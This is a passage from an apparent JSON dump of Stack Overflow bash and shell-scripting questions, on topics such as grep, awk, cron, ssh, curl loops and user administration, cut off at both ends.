Drive/Recipes/.search/results/*\n\n# Display the search dialog\nquery=$(osascript &lt;&lt;-EOF\n        set front_app to (path to frontmost application as Unicode text)\n        tell application front_app to get text returned of (display dialog \"Search     for:\" default answer \"\" with title \"Recipe Search\")\nEOF)\n\n# If query is empty (nothing was typed), exit\nif [ \"$query\" = \"\" ]\nthen\n    exit\nfi\n\necho \"Searching for \\\"$query\\\".\"\n\n# Search for query and (hard) link. The output from 'ln -v' is stored in results\n# 'ln' complains if you search for the same thing twice... mdfind database lagging?\nresults=$(mdfind -0 -onlyin ~/Google\\ Drive/Recipes/ \"$query\" | xargs -0 -J % ln -fv % ~/Google\\ Drive/Recipes/.search/results)\n\nif [ \"$results\" ]\nthen\n    # Results were found, open the folder\n    open ~/Google\\ Drive/Recipes/.search/results/\nelse\n    # No results found, display a dialog\n    osascript &lt;&lt;-EOF\n        beep\n        set front_app to (path to frontmost application as Unicode text)\n        tell application front_app to display dialog \"No results found for \\\"\" &amp; \"$query\" &amp; \"\\\".\" buttons \"Close\" default button 1 with icon 0\n    EOF\nfi\n</code></pre>\n\n<p>It works fine—the first time. If you search for the same thing twice, it breaks.</p>\n\n<p><strong>Explanation:</strong> let's say I search for \"chicken\". 34 files match, and hard links are made in the results directory.</p>\n\n<p>Now, I run the program again, and search for the same thing—\"chicken\". The directory is emptied (by <code>rm</code>). But now, the finding/linking stops working—only 6 or 7 recipes will be linked. What seems to be happening is that <code>mdfind</code> is finding the results in the search directory, <em>after they have been deleted</em>, and then <code>ln</code> can't make links. But it doesn't find the main files...\nI get</p>\n\n<pre><code>ln: ~/Google Drive/Recipes/.search/results/recipe.jpg: no such file or directory\n</code></pre>\n\n<p>I looked at <a href=\"http://stackoverflow.com/questions/1930437/mdfind-used-for-creating-symlinks-not-working-as-expected\">mdfind used for creating symlinks not working as expected</a>; they have a similar problem (but no help).</p>\n\n<p>Thanks for <em>any</em> help... this has been annoying me for a long time.</p>\n"},{"tags":["bash","shell","script"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":3,"view_count":159,"score":-3,"question_id":9918694,"title":"Write a shell script to print a diamond figure","body":"<p>This is homework, didn't mean to trick anybody, but I didn't specify that in my original post.</p>\n\n<p>Write a shell script to print the following figure (Do not hardcode).</p>\n\n<p><a href=\"http://cl.ly/1K0C1b2x3W2N3o3m1Y2y\" rel=\"nofollow\">http://cl.ly/1K0C1b2x3W2N3o3m1Y2y</a></p>\n"},{"tags":["bash"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":33,"score":0,"question_id":12669869,"title":"List copied files in bash","body":"<p>I need to copy files from one directory to another (pretty obvious :) ) but I want to store list of files that were copied with destination path. So let's say I have:\n/mnt/a/f1\n/mnt/a/f2</p>\n\n<p>and I want to copy all files from 'a' to root so I do:\n<code>cp -rv /mnt/a/* /</code></p>\n\n<p>output from cp I will have will look like:</p>\n\n<p><code>`/mnt/a/f1` -> `/f1`</p>\n\n<p>`/mnt/a/f2` -> `/f2`\n</code></p>\n\n<p>and now I want to store in some file list that will looks like:</p>\n\n<p><code>\n/f1</p>\n\n<p>/f2\n</code></p>\n\n<p>Does somebody know how can I achieve such output?</p>\n"},{"tags":["regex","bash"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":39,"score":0,"question_id":11867466,"title":"Using Regex to find string that contains one string and excludes a second string?","body":"<p>I'm trying to come up with a single regex expression that matches all strings that contain \"mobile\" and do not contain \"video\" I've been struggling to do this in a single expression and would appreciate any help.</p>\n"},{"tags":["file","bash","unix","human","readable"],"answer_count":2,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":102,"score":2,"question_id":12654026,"title":"How to count all the human readable files in Bash?","body":"<p>I'm taking an intro course to UNIX and have a homework question that follows:</p>\n\n<blockquote>\n  <p>How many files in the previous question are text files? A text file is any file containing human-readable content. (TRICK QUESTION. Run the file command on a file to see whether the file is a text file or a binary data file! If you simply count the number of files with the <code>.txt</code> extension you will get no points for this question.)</p>\n</blockquote>\n\n<p>The previous question simply asked how many regular files there were, which was easy to figure out by doing <code>find . -type f | wc -l</code>.</p>\n\n<p>I'm just having trouble determining what \"human readable content\" is, since I'm assuming it means anything besides binary/assembly, but I thought that's what <code>-type f</code> displays. Maybe that's what the professor meant by saying \"trick question\"?</p>\n\n<p>This question has a follow up later that also asks \"What text files contain the string \"csc\" in any mix of upper and lower case?\". Obviously \"text\" is referring to more than just <code>.txt</code> files, but I need to figure out the first question to determine this!</p>\n"},{"tags":["linux","bash","grep"],"answer_count":3,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":60,"score":0,"question_id":12668020,"title":"Removing characters from grep output","body":"<p>I've been whittling down my grep output (which comes down to a listing of numbers that I intend to associate with other fields.)  My problem is that numbers above 999 have commas in them, and I'm wondering how to print the output with out the commas.</p>\n\n<p>so instead of the output being:</p>\n\n<pre><code>1,200,300\n</code></pre>\n\n<p>it would just be:</p>\n\n<pre><code>1200300 \n</code></pre>\n\n<p>Any suggestions for an additional pipe command that I could add?</p>\n\n<p>Thanks</p>\n"},{"tags":["osx","bash","spotlight"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":58,"score":1,"question_id":10235504,"title":"mdls command: issue with \"kMDItemTotalBitRate\" attribute values","body":"<p>All,<br>\nI have a shell script on Mac OS X which uses the <code>mdls</code> command to fetch the Total bit-rate meta-attribute for all media files (mp3,mov,m4v etc.). I want to compare the output with a set threshold (XY Kbps) and raise a flag if the bit-rate exceeds XY for a media file. The issue is that the output doesn't denote if it's in Kbps or bits per second. For example I ran the mdls command on 2 audio files test1.m4a and test2.mp3 :      </p>\n\n<pre><code>   mdls -name kMDItemTotalBitRate test1.m4a   \n   Output -&gt; kMDItemTotalBitRate = 249\n\n\n   mdls -name kMDItemTotalBitRate test2.mp3   \n   Output -&gt; kMDItemTotalBitRate = 192000\n</code></pre>\n\n<p>On checking in iTunes , I saw that the number was 249 kbps for the former and 192 kbps for the latter. How can I force the <code>mdls</code> command to output kMDItemTotalBitRate in bits per second only so that the output is uniform for all files and removes confusion? </p>\n"},{"tags":["bash","unix","grep","command"],"answer_count":4,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":111,"score":2,"question_id":12600533,"title":"man grep | grep \"color\" gives no result","body":"<p>How come when I try to search the grep manual for the color option with this command</p>\n\n<pre><code>man grep | grep \"color\"\n</code></pre>\n\n<p>I get no result but when I run </p>\n\n<pre><code>man grep\n</code></pre>\n\n<p>man outputs this [EDITED]</p>\n\n<pre><code> --colour=[when, --color=[when]]\n         Mark up the matching text with the expression stored in GREP_COLOR environment variable.  The possible values of when can be `never', `always' or `auto'.\n</code></pre>\n"},{"tags":["linux","bash"],"answer_count":2,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":57,"score":1,"question_id":12666662,"title":"Comparing inputs and outputs - bash","body":"<p>Say i have an input file and an output file (test.in and test.out) and a program \"./myprogram\" with standard input redirected to come from test.in and use the results that are captured from standard output to be compared with test.out</p>\n\n<p>how exactly can i compare</p>\n\n<p>Im Thinking,</p>\n\n<pre><code> if [ $(myprogram &lt; test.in) == $(cat test.out) ]\n</code></pre>\n\n<p>Any suggestions?</p>\n"},{"tags":["bash","unix","pipe"],"answer_count":4,"favorite_count":0,"up_vote_count":4,"down_vote_count":0,"view_count":54,"score":4,"question_id":12666501,"title":"Unix pipes and positional arguments","body":"<p>I'm combining <code>sox</code> and <code>lame</code> to generate a new music file, but in order to do everything on one line using pipes, it seems necessary to 'mark' the output and input boundaries with a <code>-</code> character. I've inherited this code, so let me show.</p>\n\n<pre><code>sox $DIRNAME/$BASENAME -e signed-integer -r 8000 -c 2 -t wav - trim $POSITIONS | lame -v -V4 --resample 8 - $DIRNAME/${NOEXT}.mp3\n</code></pre>\n\n<p>The <code>-</code> between <code>wav</code> and <code>trim</code> is the output file, and the <code>-</code> between <code>--resample 8</code> and <code>$DIRNAME/${NOEXT}.mp3</code> is the input file. </p>\n\n<p>I'm trying to find further information on this, like whether any character can be used, or if <code>-</code> is special in this way. What is this called, and what makes it work?</p>\n"},{"tags":["bash","rvm"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":27,"score":1,"question_id":12665240,"title":"How to surpress RVM status messages when opening new bash shell?","body":"<p>Every time I open a new bash shell the following messages print to my terminal:</p>\n\n<pre><code>Using /Users/foo/.rvm/gems/ruby-1.9.3-p194\nRunning /Users/foo/.rvm/hooks/after_use\n</code></pre>\n\n<p>I am running RVM version 1.15.8 across Linux and OS X environments and both boxes are experiencing this issue. How do I surpress these messages?</p>\n\n<p>EDIT: The second message appeared to be caused by a script in the after_use directory. Rather than deleting the directory and the scripts that it contains entirely I would like to know what, precisely, is causing this so I can comment out only that line.</p>\n"},{"tags":["linux","bash"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":4,"view_count":61,"score":-3,"question_id":12665506,"title":"Add user account from file script error","body":"<blockquote>\n  <p><strong>Possible Duplicate:</strong><br>\n  <a href=\"http://stackoverflow.com/questions/12664630/linux-script-extract-information-from-excel-to-create-users\">Linux Script Extract Information From Excel To Create Users</a>  </p>\n</blockquote>\n\n\n\n<p>Need to create users from excel spread sheet, getting a few errors in my script on lines 8 and 13</p>\n\n<p>Line 8 Unexpected EOF while looking for matching `''\nLine 13 Syntax error unexpected end of file</p>\n\n<pre><code>#!bin/bash\necho $(pwd)/employeesdata.xls\nPath=$($pwd)/employeesdata.xls\nread Path\nif [ -e $Path ];\nthen\nUsername= [ grep $(Username) $Path | cut -f1 -d `]'\nPassword= [ grep $(Password) $Path | cut -f2 -d `]'\nuseradd -- b $Username\necho $Password | /usr/bin/passwd --stdin $Username\nfi\nexit\n</code></pre>\n\n<p>Excel file has this and other information </p>\n\n<pre><code>Name (field1) EmployeeID (field2)    Phone             Address      \nJoe Blow      22500033               156-454-3322       101 main\n</code></pre>\n"},{"tags":["bash","awk"],"answer_count":3,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":71,"score":0,"question_id":12664256,"title":"awk function printing..... -bash?","body":"<p>For some reason that i'm trying to figure out i'm getting \"-bash\" printed out of this script:</p>\n\n<pre><code>cat sample | awk -v al=$0 -F\"|\" '{n = split(al, a, \"|\")} {print a[1]}'\n</code></pre>\n\n<p>the 'sample' file contains psv \"pipe separated value\", like a|b|c|d|e|f|d.<br>\nMy intention is to use an array.<br>\nThe result of the above script is an array of length 1 and th only item contained is \"-bash\", the name of the shell.<br>\n$0 by default points to the program that is currently used, but as far as i know, within an awk script, the $0 parameter 'should' point to the entire line being read.</p>\n\n<p>since i would like to understand where the problem exaclty is \"i'm new to bash/awk\"\ncan you point me out which of the following steps is failing?<br>\n1-\"concatenate\" the sample file and pass it as input for the awk script<br>\n2-define a variable named 'al' with as value each line contained in 'sample'<br>\n3-define a pipe \"|\" as field separator<br>\n4-define an action, split the value of 'al' into an array named 'a' using a pipe as splitter<br>\n5-define another action, which in this case is simply printing the first item in the array<br></p>\n\n<p>Any advice? thank you! </p>\n"},{"tags":["bash","arguments"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":40,"score":0,"question_id":12665144,"title":"Argument check- bash","body":"<p>Suppose I have a script that takes two arguments, is there way to check if there is one argument or 2+ arguments in say the form:</p>\n\n<pre><code>if [ check if arguments don't equal 2 ]; then\n    echo Too many arguments\n    exit 1\nfi\n</code></pre>\n"},{"tags":["linux","bash","script","grep","ifconfig"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":65,"score":0,"question_id":12664473,"title":"How to cut ifconfig to get eth* details alone?","body":"<p>I'm writing a script to print ethtool details of ifconfig.</p>\n\n<p>Sample output should be from ifconfig is like,</p>\n\n<pre><code>eth0\neth1\neth2\n</code></pre>\n\n<p>I have tried using below command, </p>\n\n<pre><code>root@bt# ifconfig | cut -d \":\" -f 1 \n</code></pre>\n\n<p>But could not able to achieve the same.</p>\n\n<p>Actually, i need to get these <code>eth*</code> and pass in</p>\n\n<pre><code>root@bt# ethtool &lt;arg1&gt; where arg1=eth*\n</code></pre>\n\n<p>to get results :-) can you please help me to get crop from ifconfig. ?</p>\n"},{"tags":["bash","conditional"],"answer_count":2,"favorite_count":0,"up_vote_count":3,"down_vote_count":0,"view_count":75,"score":3,"question_id":12662230,"title":"Bash \"inline\" conditionals","body":"<p>My goal is to add an argument to a program being executed if a bash variable is existent, as so:</p>\n\n<p><code>bob -a some_arg (( if we have ${VAR} defined add '-b ${VAR}' as an argument ))</code></p>\n\n<p>I'd like to avoid something like:</p>\n\n<pre><code>if [[ -z ${VAR} ]]; then\n    bob -a some_arg\nelse\n    bob -a some_arg -b ${VAR}\nfi\n</code></pre>\n\n<p>Although, it is the only option?</p>\n"},{"tags":["linux","bash","cron","clock","alarm"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":183,"score":0,"question_id":12043446,"title":"CRON Alarm Clock Linux Mint Stops Suddenly [SOLVED]","body":"<p>I'm new to linux and I'm learning to script an alarm clock using bash and cron. The script works fine from bash and by double clicking on it, but not from cron; as soon as cron calls the script, the alarm sounds once (one loop, it seems) and then stops without even showing the dialog box (zenity). I'm using Linux Mint 13 Maya XFCE.</p>\n\n<p>Here is my crontab setup</p>\n\n<pre><code>* * * * * /home/x/Documents/MyScripts/Cron/BeepAlarm \"Wake Up\"\n</code></pre>\n\n<p>And here is my script</p>\n\n<pre><code>!#/bin/bash\n\n# Initialize Variables\nText=$1\nTitle=\"Alarm\"\nOkLabel=\"Snooze\"\nCancelLabel='Shut It Up!'\nIcon=/home/x/.icons/actions/48/appointment-new.png # Won't work\nSnoozeTimeout=120\nAlarmCycles=100\nshopt expand_aliases\nalias vol='amixer -q -c 0 sset Beep'\nvol 25% # Heart friendly\nrm -f LoopMode # Just in case =P\n\n# Dialog Box Function\n_MsgBox () {\n    if zenity --question --title=\"$Title\" \\\n    --window-icon=$Icon --ok-label=\"$OkLabel\" \\\n    --cancel-label=\"$CancelLabel\" --text=\"$Text\"\n    then\n        echo 1 &gt; LoopMode\n    else\n        echo 2 &gt; LoopMode\n        #kill -TERM `jobs -p` # Won't work\n    fi\n}\n\n# Alarm Loop\nwhile [ $AlarmCycles -gt 0 ]; do\n    case `cat LoopMode` in\n        \"\") # Question Box\n            echo 0 &gt; LoopMode\n            _MsgBox &amp;\n            ;;\n\n        1)  # Snooze\n            vol 25%\n            rm -f LoopMode\n            sleep $SnoozeTimeout\n            ;;\n\n        2)  # Stop Alarm\n            break # But don't sleep again\n            ;;\n\n        *)  # Get on my nerves\n            beep -r 4 -l 20 -f 2000; sleep 0.5\n            beep -r 4 -l 20 -f 4000; sleep 0.5\n            AlarmCycles=$((AlarmCycles-1))\n            vol 5%+\n\n    esac\ndone\n\n# Housekeeping~\nkill $(($!+2)) # I don't know a better way to kill zenity Dialog\nvol 25%   #  =)\nrm -f LoopMode\n</code></pre>\n\n<p>I'd appreciate any help</p>\n"},{"tags":["html","linux","bash","command","line"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":68,"score":0,"question_id":12655297,"title":"How to search for a specific text and echo next characters of that specific text?","body":"<p>I have a project requirement where next characters of a text need to be printed after searching a specific text.</p>\n\n<p>To understand better, here is an example.</p>\n\n<p>I have an <code>index.html</code> file and would like to print a specific text after searching the text.</p>\n\n<p>Question : I have text <code>&lt;b&gt;WELCOME&lt;/b&gt;</code> in <code>index.html</code>. Now i want to search for <code>&lt;b&gt;</code>, print text <code>WELCOME</code> until <code>&lt;/b&gt;</code>.</p>\n\n<pre><code>bash# cat index.html | grep \"\" ?? \n</code></pre>\n\n<p>Please help me to print this content using a shell command or shell script in Linux.</p>\n"},{"tags":["linux","bash"],"answer_count":2,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":32,"score":1,"question_id":12658382,"title":"Calling variables to run scripts","body":"<p>I have a script that lists all files in a directory, lists them in alphabetical order, and places the number of the file before the filename.</p>\n\n<pre><code>#!/bin/bash\n\nx=1\ncd ~/bin\n\nfor f in *\ndo\n    if [ -f $f ]; then\n        echo \"$x: $f\"\n        declare a$x=$f\n        x=$(expr $x + 1)\n    fi\ndone\n\nread -p \"What would you like to execute?: \" num\n$num\n</code></pre>\n\n<p>Output would be</p>\n\n<pre><code>1: file0\n2: file1\n3: file2\n</code></pre>\n\n<p>etc</p>\n\n<p>Running $num will execute the command</p>\n\n<pre><code>a1\n</code></pre>\n\n<p>which is not a command. What I want to do is run what $a1 is equal to (ie file0). How can I do this?</p>\n"},{"tags":["linux","bash","shell","loops","script"],"answer_count":2,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":46,"score":1,"question_id":12660688,"title":"How to print al list of user one by one with complete information in linux using shell","body":"<p>I have started writing a small piece of code to print all the list of users available in the linux box. But I want to pass one by one user into my command to display each user details together.</p>\n\n<h3>to list all users</h3>\n\n<pre><code>root@bt# getent passwd | grep /home/ | cut -d ':' -f 1\n\nroot\nsan\npostgres\n</code></pre>\n\n<p>Now I want to pass one by user in to the below command to display each user details together.</p>\n\n<pre><code>root@bt# chage -l ${user1} ; chage -l ${user2} etcc.\n</code></pre>\n\n<p>should I need to user for loop or while loop here? \ncan any one help me in suggesting how to write the same?</p>\n"},{"tags":["bash","svn","svn-externals","svn-propset"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":69,"score":1,"question_id":12403043,"title":"set svn:externals from script","body":"<p>I am trying to set the <code>svn:externals</code> property from a bash script. The line that fails is:</p>\n\n<pre><code>svn propset svn:externals \\'WEB-INF/src/com/project https://subversion.assembla.com/svn/myProject/branches/Release_$Version/com/project\\' .\n</code></pre>\n\n<p>Where <code>$Version</code> is a variable taken from a command line argument.</p>\n\n<p>The trouble is, this line works fine from the prompt but doesn't work in a script. I tested this by echoing the line to the console, copying and pasting it to the command prompt and running. It works fine from the prompt but not from the script. When run from the script I get the following error: </p>\n\n<pre><code>svn: E200009: Cannot mix repository and working copy targets\n</code></pre>\n\n<p>I have searched the net for hours but cannot find any answers. I have a feeling that the problem may be to do with the escape characters used to escape the ' character but I am not sure how to fix it.</p>\n"},{"tags":["linux","bash","ldap"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":33,"score":0,"question_id":12651940,"title":"Is there anyway to execute system commands via LDAP command line?","body":"<p>In linux system,I know that we can execute system commands via Mysql command like by using !  . I would like to know if we can do something like that via LDAP. </p>\n"},{"tags":["bash","sorting"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":41,"score":0,"question_id":11527469,"title":"Output arguments in sorted order","body":"<p>I need to write a bash script that prints out its command line arguments in sorted order, one per line.</p>\n\n<p>I wrote this script and it works fine, but is there any other way? Especially without outputting it to a file and sorting.</p>\n\n<pre><code>#!/bin/bash\n\nfor var in $*\ndo\n    echo $var &gt;&gt; file\ndone\n\nsort file\nrm file\n</code></pre>\n\n<p>Test run of the program:</p>\n\n<pre><code>$ script hello  goodbye zzz aa\naa\ngoodbye\nhello\nzzz\n</code></pre>\n"},{"tags":["linux","bash","unix","syntax","gnu"],"answer_count":3,"favorite_count":11,"up_vote_count":49,"down_vote_count":0,"view_count":18409,"score":49,"question_id":171924,"title":"How do I check syntax in bash without running the script?","body":"<p>Is it possible to check a bash script syntax without executing it?</p>\n\n<p>Using Perl, I can run <code>perl -c 'script name'</code>. Is there any equivalent command for bash scripts?</p>\n"},{"tags":["linux","bash","script","grep"],"answer_count":2,"favorite_count":0,"up_vote_count":3,"down_vote_count":1,"view_count":69,"score":2,"question_id":12658251,"title":"Bash Grep View Count from Youtube","body":"<p>I'm trying to make a bash script where I would something like <code>wget -O youtube.html http://youtube.com</code>. I'm trying to figure out how to only the view counts with <code>grep</code>. I've used <code>grep [0-9].views youtube.html</code> but I'm still returning lots of unnecessary lines.</p>\n\n<p>If someone could give me some hints that'd be great.</p>\n"},{"tags":["performance","bash","loops","script","while-loop"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":2,"view_count":40,"score":-2,"question_id":12658050,"title":"I cannot seem to run this properly... It stucks and does not display an output","body":"<p>Here's my script:</p>\n\n<pre><code>while [[ $startTime -le $endTime ]]\ndo\n\nthisfile=$(find * -type f | xargs grep -l $startDate | xargs grep -l $startTime)\nfordestination=`cut -d$ -f2 $thisfile | xargs cut -d ~ -f4`\n\necho $fordestination\n\nstartTime=$(( $startTime + 1 ))\n\ndone\n</code></pre>\n"},{"tags":["linux","bash","curl"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":1,"view_count":119,"score":-1,"question_id":12229198,"title":"Bash | curl | curls 2 URL's then stops","body":"<p>I am trying to write a simple bash script that will use a list from a text document and curl each URL that is on the list in order to see what the contents of each URL is. It allows me to cURL 2 sites and creates the text documents for the rest however it only downloads the first 2. I have already manage to write the script that pulls there IP's and places them in a seperate file using the grep command.  At first i tried </p>\n\n<pre><code>#!/bin/bash\nfor var in `cat host.txt`; do\ncurl -s $var &gt;&gt; /tmp/ping/html/$var.html\ndone\n</code></pre>\n\n<p>I have tried with and without the silent switch. I then tried the following:</p>\n\n<pre><code>#!/bin/bash  \nfor var in `head -2 host.txt`; do  \ncurl $var &gt;&gt; /tmp/ping/html/$var.html  \nwait  \ndone  \nfor var in `head -4 host.txt | tail -2`; do  \ncurl $var &gt;&gt; /tmp/ping/html/$var.html  \ndone  \n</code></pre>\n\n<p>This would try and do them all at the same time again stopping after 2</p>\n\n<pre><code>#!/bin/bash  \nfor var in `head -2 host.txt`; do  \ncurl $var &gt;&gt; /tmp/ping/html/$var.html   \ndone \nwait \nfor var in `head -4 host.txt | tail -2`; do  \ncurl $var &gt;&gt; /tmp/ping/html/$var.html  \ndone  \n</code></pre>\n\n<p>This would do the same, I am new to bash scripting and only know some of the basics, any help would be appreciated</p>\n"},{"tags":["bash","boost","cron"],"answer_count":4,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":155,"score":0,"question_id":7917512,"title":"Bash script failing when run via cron, can't find Libboost library","body":"<p>I am running a bash script that uses libboost to hold a statistical model in memory. When I run the script directly from the command line (ie: # /pylda/exec-test.sh) it works fine. However, when it runs on the cron job, I get the following error:</p>\n\n<pre><code>\"/root/pylda/src/infer: error while loading shared libraries: libboost_program_options.so.1.46.1: cannot open shared object file: No such file or directory\"\n</code></pre>\n\n<p>How does cron behave differently? Is there an environmental variable that needs to be set? This is cron as root, as far as I know.</p>\n\n<p>Thanks</p>\n"},{"tags":["bash"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":1,"view_count":25,"score":-1,"question_id":12658112,"title":"difference in output of bash script","body":"<p>I have saved following command in a script called dir</p>\n\n<pre><code>ls -la | egrep '^d'\n</code></pre>\n\n<p>i saved the file dir under  my home/bin directory, which also happens to be in my PATH variable. If i execute dir command from any other directory, it has the effect of a simple ls, but  if i copy this file into any folder and then run dir, i get the correct output. </p>\n\n<p>what needs to be done, so that i can run the above script by simply typing dir and it shows me the correct result?</p>\n\n<p>UPDATE: the above works correctly on mac os x, but does not work correctly under linux as explained above.</p>\n"},{"tags":["linux","bash","shell","autocomplete","sh"],"answer_count":2,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":83,"score":2,"question_id":11290833,"title":"Check from within bash script that autocompletion is initialized","body":"<p>I'm looking for a method to check from within my shell script that script specific completion have been initialized by user using <code>complete -F ...</code></p>\n\n<p>I want this check to print out an advice on how to initialize the completion like:</p>\n\n<p><code>Warning: Auto completion is not initialized. Please run : source ....; complete -F ...</code></p>\n\n<p>The problem is that the script,being run in a sub-shell has no information about \"complete\" environment of the parent shell where user is working.</p>\n\n<p>So <code>complete -p| grep my-script-name</code> never return any result.</p>\n\n<p>User is expected to run \"source\" and \"complete\" commands or add them into his .bashrc manually, because we're working on a server where we have no access to the bash completion system directory.</p>\n\n<p>Alternatively if you know a method of initializing(and not only checking) the auto-complete from within the script, I would happily accept it.</p>\n"},{"tags":["bash","ssh","csh"],"answer_count":9,"favorite_count":26,"up_vote_count":53,"down_vote_count":0,"view_count":45415,"score":53,"question_id":29142,"title":"Getting ssh to execute a command in the background on target machine","body":"<p>This is a follow-on question to the <a href=\"http://stackoverflow.com/questions/29061/how-do-you-use-ssh-in-a-shell-script\">How do you use ssh in a shell script?</a> question.  If I want to execute a command on the remote machine that runs in the background on that machine, how do I get the ssh command to return?  When I try to just include the ampersand (&amp;) at the end of the command it just hangs.  The exact form of the command looks like this:</p>\n\n<pre><code>ssh user@target \"cd /some/directory; program-to-execute &amp;\"\n</code></pre>\n\n<p>Any ideas?  One thing to note is that logins to the the target machine always produce a text banner and I have <strong>SSH</strong> keys set up so no password is required.</p>\n"},{"tags":["bash"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":39,"score":0,"question_id":12657037,"title":"parameter expansion with substitution in bash","body":"<p>I have a trivial problem with regular expression in bash.</p>\n\n<pre><code>#!/bin/bash\nFNAME=$1\necho ${FNAME//.*\\/tests\\//}\n</code></pre>\n\n<p>I want to remove everything before /test/ including the /test/ as well. Because of some reasons \".*\" doesn't work.</p>\n\n<pre><code>$ ./eclipse/unittest.sh /foo/tests/bar\n/foo/tests/bar\n</code></pre>\n\n<p>How do I select anything in bash reg exp?</p>\n"},{"tags":["bash","readline"],"answer_count":2,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":41,"score":1,"question_id":12337770,"title":"Brace Expansion and Readline","body":"<p>If I have the following:</p>\n\n<pre><code>a=xyz\necho $a\n</code></pre>\n\n<p>I can execute the readline command C-M-e after the <code>$a</code> and get:</p>\n\n<pre><code>echo xyz\n</code></pre>\n\n<p>before the command is executed.</p>\n\n<p>However, if I type:</p>\n\n<pre><code>echo a{x,y,z}b\n</code></pre>\n\n<p>and then issue the readline command C-M-e, I still get:</p>\n\n<pre><code>echo a{x,y,z}b\n</code></pre>\n\n<p>not as I was expecting:</p>\n\n<pre><code>echo axb ayb azb\n</code></pre>\n\n<p>Is there a readline command for brace expansion?</p>\n"},{"tags":["linux","git","bash","sed"],"answer_count":4,"favorite_count":0,"up_vote_count":8,"down_vote_count":0,"view_count":368,"score":8,"question_id":9651898,"title":"Is there a 'git sed' or equivalent?","body":"<p>Let's say I want to rename a method in source code contained in a git repository. I could do this by hand, but the method name might be in multiple places (e.g., unit test, documentation, actual method). To check where the method is used, I use 'git grep'. I get 'git grep' to show only lines that I want to change, and then I don't have a workflow to automatically change those lines. </p>\n\n<p>I'm looking for an automated way (hopefully using git tools) to do this last step. I was hoping there was some sort of 'git sed' or equivalent, but I can't find any. </p>\n\n<p>The interface I'm thinking would be nice: git sed 's/old-method-name/new-method-name/g'</p>\n"},{"tags":["c++","linux","bash"],"answer_count":4,"favorite_count":1,"up_vote_count":3,"down_vote_count":0,"view_count":72,"score":3,"question_id":12654865,"title":"How to install programs on Linux from a makefile?","body":"<blockquote>\n  <p><strong>Possible Duplicate:</strong><br>\n  <a href=\"http://stackoverflow.com/questions/528399/what-should-linux-unix-make-install-consist-of\">What should Linux/Unix &#39;make install&#39; consist of?</a>  </p>\n</blockquote>\n\n\n\n<p>I'm making a program that can be invoked from the command line, like <code>./prog arg1 arg2</code>. I was wondering, how can I make it so that I can run it from anywhere on the system? I know that I could put <code>prog</code> into <code>/usr/bin/</code>, but what if my program needs resources from its install directory (that can be wherever the user downloaded it)?</p>\n"},{"tags":["bash","unix","shell"],"answer_count":6,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":301,"score":0,"question_id":3887347,"title":"How would I use grep on a single word in UNIX?","body":"<p>I want to run a script in unix that will look for a specific pattern  inside a passed argument. The argument is a single word, in all cases. I cannot use grep, as grep only works on searching through files. Is there a better unix command out there that can help me?</p>\n"},{"tags":["perl","bash"],"answer_count":3,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":214,"score":1,"question_id":7822767,"title":"bash colored text and piping","body":"<p>I have a Perl script that outputs some colored text under bash. For example, this will output a red string:</p>\n\n<pre><code>perl -e 'print \"\\e[1;31m RED \\e[m\"\n</code></pre>\n\n<p>When I pipe it to another program, e.g. vim <code>... | vim -</code> , I can see the color formating clutter-characters:</p>\n\n<pre><code>^[[1;31m RED ^[[m\n</code></pre>\n\n<p>and I want them to be skipped. It happens for example for <code>grep</code>, that you see colors in bash, but they are skipped when the output is redirected.</p>\n\n<p>How to do that?</p>\n"},{"tags":["linux","bash","sed","awk"],"answer_count":3,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":76,"score":0,"question_id":12651543,"title":"Using pipes in AWK","body":"<p>Writing script in AWK - input data - time in format <code>31.12.2012</code>. I want to compare 2 dates - system date and this date. I think the best way is to convert both dates into unix timestamp, make deduction and then compare with conditional. Date can be converted into unix timestamp only with this format <code>2012-12-31</code> . To convert into this format I write SED expression <code>sed -n -e \"s_\\(..\\)\\(.\\)\\(..\\)\\(.\\)\\(....\\)_\\5-\\3-\\1_p\"</code>. And then we must convert this expression with command <code>date --utc --date \"2012-12-31\" +%s</code>. But pipes doesnt want to work.</p>\n\n<p>In the AWK i wrote:</p>\n\n<hr>\n\n<pre><code>#/usr/bin/awk -f\nBEGIN {\n    FS=\",\";\n}\n{\n    split($3, account, \"/\");\n    gsub(/ $/, \"\", account[1]);\n    split($4, products, \"\\\\\\\\n\");\n    split($5, supports, \"\\\\\\\\n\");\n    for (i in products) {\n        gsub(\"\\\"\", \"\", products[i]);\n        gsub(\"\\\"\", \"\", supports[i]);\n        split(supports[i], timesupport, \"\\ &gt; \");\n        \"date +%s\" | getline 